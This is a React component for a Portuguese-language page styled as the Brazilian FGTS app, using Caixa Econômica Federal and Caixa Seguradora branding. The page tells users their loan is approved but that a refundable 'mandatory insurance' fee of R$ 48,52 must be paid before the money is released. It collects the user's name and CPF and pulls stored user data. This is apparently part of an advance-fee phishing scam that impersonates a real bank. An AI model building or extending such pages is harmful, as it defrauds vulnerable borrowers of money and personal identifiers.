
import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { AlertTriangle, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import FGTSLogo from '@/components/FGTSLogo';
import { useIsMobile } from '@/hooks/use-mobile';

const InsuranceRequest = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const isMobile = useIsMobile();
  const [name, setName] = useState('');
  const [cpf, setCpf] = useState('');
  const [storedCPF, setStoredCPF] = useState<string>('');
  const [storedUserName, setStoredUserName] = useState<string>('');
  
  // Add scroll to top effect and get stored user data
  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Get user data from localStorage
    const savedCPF = localStorage.getItem('userCPF') || '';
    setStoredCPF(savedCPF);
    
    // Try to get user name from stored data
    try {
      const userData = localStorage.getItem('userData');
      if (userData) {
        const parsedData = JSON.parse(userData);
        if (parsedData && parsedData.DADOS && parsedData.DADOS.nome) {
          setStoredUserName(parsedData.DADOS.nome);
        }
      }
    } catch (error) {
      console.error('Error parsing userData:', error);
    }
  }, []);
  
  // Get the selected bank data from location state
  const { 
    bankLogo, 
    bankName,
    totalAmount,
    installmentsCount,
    installmentValue,
    interestRate,
    userName,
    userCPF,
    pixKey
  } = location.state || {
    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
    bankName: "Caixa Econômica Federal",
    totalAmount: 10000,
    installmentsCount: 60,
    installmentValue: 250,
    interestRate: 0.018,
    userName: "JUAREZ JOSE FERNANDES DE FREITAS",
    userCPF: "123.456.789-00"
  };

  // Get actual values, preferring localStorage values over location state
  const actualUserName = storedUserName || userName;
  const actualCPF = storedCPF || userCPF;

  // Format CPF with dots and dash if it's not already formatted
  const formatCPF = (cpf: string) => {
    if (!cpf) return '';
    if (cpf.includes('.') || cpf.includes('-')) return cpf;
    
    const cpfDigits = cpf.replace(/\D/g, '');
    if (cpfDigits.length !== 11) return cpf;
    
    return `${cpfDigits.slice(0, 3)}.${cpfDigits.slice(3, 6)}.${cpfDigits.slice(6, 9)}-${cpfDigits.slice(9)}`;
  };

  const formatCurrency = (value: number): string => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(value);
  };

  const handleSubmit = () => {
    // Navigate to the confirmation processing page
    navigate('/confirmation-processing', {
      state: {
        bankLogo,
        bankName,
        totalAmount,
        installmentsCount,
        installmentValue,
        interestRate,
        userName: name || actualUserName,
        userCPF: cpf || actualCPF,
        pixKey,
        insuranceAmount: 48.52
      }
    });
  };

  return (
    <div className="min-h-[100svh] flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9] overflow-hidden">
      {/* Header */}
      <div className="p-4 sm:p-6 flex justify-between items-center">
        <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
        <div className="h-10"></div> {/* Placeholder for symmetry */}
      </div>

      {/* Title */}
      <div className="p-4 sm:p-6">
        <div className="text-white text-2xl font-light">Seguro Obrigatório</div>
        <div className="text-white opacity-60 text-sm mt-1">
          Finalize o processo para liberação dos valores
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 bg-white rounded-t-3xl overflow-hidden flex flex-col">
        <div className="flex-1 p-4 sm:p-6 flex flex-col pb-32">
          <div className="flex flex-col max-w-md mx-auto w-full">
            {/* Insurance logo */}
            <div className="flex justify-center mb-6">
              <img 
                src="https://media2.proteste.org.br//images/DDBB8128AB9AB42685E575D2A51C4EAF700D438A/caixa-seguradora.png"
                alt="Caixa Seguradora"
                className="w-48 h-auto object-contain"
              />
            </div>
            
            {/* Alert box */}
            <div className="bg-orange-50 border-l-4 border-orange-500 p-4 mb-6">
              <div className="flex items-start">
                <div className="flex-shrink-0">
                  <AlertTriangle className="h-6 w-6 text-orange-500" />
                </div>
                <div className="ml-3">
                  <h3 className="text-lg font-medium text-orange-800">PEDIDO DE ADIÇÃO DE SEGURO CAIXA SEGURADORA</h3>
                </div>
              </div>
            </div>
            
            {/* Description */}
            <p className="text-gray-700 mb-6">
              O seu empréstimo foi aprovado, mas para que o saque seja efetuado para os dados bancários informados, 
              é necessário assinar o contrato com a seguradora de inadimplência. A Caixa Seguradora solicitou o 
              pagamento de um seguro no valor de R$ 48,52, que visa garantir a segurança da transação.
            </p>
            
            {/* Highlighted text */}
            <div className="bg-green-50 p-4 border-l-4 border-green-500 mb-6">
              <p className="font-medium text-green-800">
                Esse valor será devolvido após a finalização de todas as taxas do empréstimo, 
                garantindo a liberação completa do montante solicitado.
              </p>
            </div>
            
            {/* Form */}
            <div className="space-y-4 mb-6">
              <div>
                <Label htmlFor="fullName">Nome Completo:</Label>
                <Input 
                  id="fullName" 
                  value={name || actualUserName}
                  onChange={(e) => setName(e.target.value)}
                  className="mt-1"
                />
              </div>
              
              <div>
                <Label htmlFor="cpf">CPF:</Label>
                <Input 
                  id="cpf" 
                  value={cpf || formatCPF(actualCPF)}
                  onChange={(e) => setCpf(e.target.value)}
                  className="mt-1"
                />
              </div>
            </div>
            
            {/* Operation details */}
            <div className="border rounded-lg p-4 mb-8">
              <h3 className="font-semibold text-lg mb-2">Dados da Operação:</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-600">Natureza da operação:</span>
                  <span className="font-medium">Empréstimo CLT</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Valor Total Contratado:</span>
                  <span className="font-medium">{formatCurrency(totalAmount)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Valor das parcelas:</span>
                  <span className="font-medium">{formatCurrency(installmentValue)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Garantias acessórias:</span>
                  <span className="font-medium">Saldo FGTS</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Parcelas a vencer:</span>
                  <span className="font-medium">Data do Pagamento da empresa do contratado</span>
                </div>
              </div>
            </div>
            
            {/* Payment button */}
            <Button 
              onClick={handleSubmit} 
              className="w-full bg-[#005CA9] hover:bg-[#004A87] py-6 rounded-full mb-8"
            >
              EFETUAR PAGAMENTO DE R$ 48,52
            </Button>
          </div>
        </div>
        
        {/* Footer */}
        <div className="mt-auto w-full bg-white border-t border-gray-200">
          <div className="flex justify-around items-center py-3">
            <div className="flex flex-col items-center text-gray-500">
              <Home size={24} />
              <span className="text-xs mt-1">Principal</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <BarChart3 size={24} />
              <span className="text-xs mt-1">Meu FGTS</span>
            </div>
            <div className="flex flex-col items-center">
              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
                <DollarSign size={24} className="text-white" />
              </div>
              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <HelpCircle size={24} />
              <span className="text-xs mt-1">Ajuda</span>
            </div>
            <div className="flex flex-col items-center text-gray-500">
              <MoreHorizontal size={24} />
              <span className="text-xs mt-1">Mais</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InsuranceRequest;
